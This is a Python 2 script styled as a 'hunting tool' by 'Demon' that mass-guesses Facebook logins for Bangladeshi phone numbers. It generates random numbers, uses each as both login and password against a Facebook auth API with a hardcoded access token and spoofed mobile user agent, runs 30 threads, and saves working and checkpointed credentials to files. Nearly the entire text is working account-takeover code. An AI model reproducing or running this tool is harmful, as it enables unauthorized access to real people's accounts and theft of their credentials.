#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Demon
#If You Wanna Take Credits For This Code, Please Look Yourself Again...






import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 

def t():
    time.sleep(1)
def cb():
    os.system('clear')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
##### LOGO #####
logo='''
  _____                             
 |  __ \   Nothing is impossible                    
 | |  | | ___ _ __ ___   ___  _ __  
 | |  | |/ _ \ '_ ` _ \ / _ \| '_ \ 
 | |__| |  __/ | | | | | (_) | | | |
 |_____/ \___|_| |_| |_|\___/|_| |_|
Hunting Tool (BD 8 Digit)
--------------------------------------------------
 • Author     : Demon
 • GitHub     : https://GitHub.com/abdullahalemon2
 • Facebook   : fb.com/abdullahalemon2
 • Support    : Jobra King | Imran Vau | Mr.Ha3k3R
 • Updated On : Feb 5 2021
--------------------------------------------------
                                '''
os.system('clear')
print (logo)
#BD 07
CorrectUsername = "simpleuser9999"
CorrectPassword = "Demon"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;97mTool USERNAME \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;97mTool PASWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "NASA Hacked Successful...."
            loop = 'false'
        else:
            print "\033[1;91mWrong!,\033[1;92mText me to get the correct password"
            os.system('xdg-open https://facebook.com/abdullahalemon2')

    else:
        print "\033[1;91mWrong!,\033[1;92mText me to get the correct username"
        

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print("Input 3 Digit without +880 Example: For Robi Number 186 ")
	try:
			c = raw_input(" choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
	except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	xxx = str(len(id))
        psb ('[✓] Please wait')
	psb ('[✓] Total : ''992961987')
	time.sleep(0.5)
	psb ('[✓] Lets Start Hunting')
	time.sleep(0.5)
	print 50*'-'
        psb ('Hacked Accouny Will Appear Here')
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[👽Hacked👽]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '[Login After 10 Days] ' + k + c + user + ' | ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('cat .README.md')
		
if __name__ == '__main__':
	menu()
 
